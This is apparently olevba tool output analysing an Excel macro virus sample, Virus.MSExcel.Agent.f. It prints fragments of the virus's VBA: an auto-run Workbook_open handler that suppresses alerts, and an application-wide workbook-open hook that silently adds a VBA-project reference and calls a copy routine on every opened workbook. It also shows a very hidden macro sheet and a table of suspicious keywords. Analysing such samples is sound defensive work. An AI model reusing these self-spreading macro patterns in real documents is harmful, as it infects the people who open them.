olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Agent.f-e5a607c4ab1d948a2ba18a84a32a07e8fc41132e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Agent.f-e5a607c4ab1d948a2ba18a84a32a07e8fc41132e - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents xx As Application
Attribute xx.VB_VarHelpID = -1
Private Sub Workbook_open()
Set xx = Application
On Error Resume Next
Application.DisplayAlerts = False
Call do_what
End Sub
Private Sub xx_workbookOpen(ByVal wb As Workbook)
On Error Resume Next
wb.VBProject.References.AddFromGuid _
GUID:="{0002E157-0000-0000-C000-000000000046}", _
Major:=5, Minor:=3
Application.ScreenUpdating = False
Application.DisplayAlerts = False
copystart wb
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Agent.f-e5a607c4ab1d948a2ba18a84a32a07e8fc41132e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  Macro
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ,{ N
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_open       |Runs when the Excel Workbook is opened       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

